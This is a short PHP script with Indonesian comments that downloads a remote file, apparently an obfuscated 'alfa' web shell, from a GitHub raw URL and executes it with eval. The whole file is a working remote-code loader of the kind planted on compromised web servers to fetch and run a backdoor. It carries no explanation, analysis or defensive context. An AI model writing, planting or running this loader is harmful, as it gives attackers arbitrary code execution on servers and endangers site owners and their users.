<?php
// Mengambil dan mengeksekusi kode dari URL
$link = 'https://raw.githubusercontent.com/X-Projetion/css/refs/heads/main/alfa-obfuscated.php.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
curl_close($ch);

// Mengeksekusi kode yang diambil
eval('?>' . $output);
?>
